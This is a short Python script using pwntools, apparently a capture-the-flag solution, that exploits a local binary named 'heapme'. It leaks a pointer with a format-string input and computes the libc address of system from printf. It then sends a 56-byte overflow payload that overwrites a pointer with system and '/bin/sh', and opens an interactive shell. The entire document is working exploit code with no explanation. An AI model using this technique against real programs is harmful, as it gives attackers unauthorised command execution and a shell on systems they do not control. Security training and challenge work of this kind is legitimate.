#!/usr/bin/env python3
from pwn import *

process_obj = process('./heapme')
process_obj.sendline(b'%2$p')
printf_add = int(process_obj.recv(), 16)

elf = ELF("./heapme")
prinf_system_difference = elf.libc.symbols["system"]- elf.libc.symbols["printf"]

system_add = printf_add + prinf_system_difference

payload = b"H" * 56 + p64(system_add) + b'/bin/sh'
process_obj.sendline(payload)
process_obj.interactive()
